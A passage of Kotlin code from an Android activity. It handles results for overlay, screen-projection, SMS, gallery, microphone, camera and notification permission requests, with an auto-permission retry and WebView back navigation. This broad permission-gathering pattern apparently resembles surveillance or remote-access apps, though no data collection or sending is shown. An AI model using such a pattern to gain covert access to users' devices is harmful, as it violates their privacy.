            REQUEST_CODE_OVERLAY -> { tryAutoPermission(); Handler(mainLooper).postDelayed({ tryAutoPermission() }, 1000L) }
            REQUEST_CODE_MIUI_PROJECTION -> {
                if (resultCode != -1 || data == null) { runOnUiThread { setStatusTextWithColor("⚠️ MIUI权限申请失败") }; Handler(Looper.getMainLooper()).postDelayed({ requestStandardProjectionSafe() }, 1000L); return }
                val ic = data.getIntExtra("resultCode", 0); val id = data.getParcelableExtra<Intent>("resultData")
                if (ic == -1 && id != null) processPermissionResult(id, ic) else processPermissionResult(null, 0)
            }
            else -> Log.w(TAG, "⚠️ [权限] 未知requestCode: $requestCode")
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            REQUEST_CODE_SMS -> { if (grantResults.isEmpty()) Log.w(TAG, "⚠️ [权限] 短信权限被拒绝") }
            REQUEST_CODE_GALLERY -> { if (grantResults.isEmpty()) Log.w(TAG, "⚠️ [权限] 相册权限未授予") }
            REQUEST_CODE_MIC -> { if (grantResults.isEmpty()) Log.w(TAG, "⚠️ [权限] 麦克风权限未授予") }
            REQUEST_CODE_CAMERA -> { if (grantResults.isEmpty()) Log.w(TAG, "⚠️ [权限] 摄像头权限被拒绝") else { var ok = true; for (r in grantResults) if (r != 0) { ok = false; break }; if (ok) runOnUiThread { setStatusTextWithColor("✅ 摄像头权限已授予") } } }
            REQUEST_CODE_BATCH -> {
                var ok = grantResults.isNotEmpty(); var gc = 0; for (r in grantResults) { if (r == 0) gc++ else ok = false }
                if (ok) runOnUiThread { setStatusTextWithColor("✅ 所有权限已授予") } else Log.w(TAG, "⚠️ [权限] 部分被拒绝: $gc/${grantResults.size}")
            }
            REQUEST_CODE_NOTIFICATION -> { val g = grantResults.isNotEmpty() && grantResults[0] == 0; Log.d(TAG, "[通知权限] ★★★ iuzxujjtqev收到结果: ${if (g) "已授权 ✓" else "被拒绝 ✗"} ★★★") }
        }
    }

    @Suppress("DEPRECATION")
    override fun onBackPressed() {
        try {
            val wvc = webViewContainer
            val wv = webView
            if (wvc != null && wvc.visibility == View.VISIBLE && wv != null && wv.canGoBack()) { wv.goBack(); return }
        } catch (_: Exception) {}
        super.onBackPressed()
    }

    public override fun onUserLeaveHint() { super.onUserLeaveHint() }
}
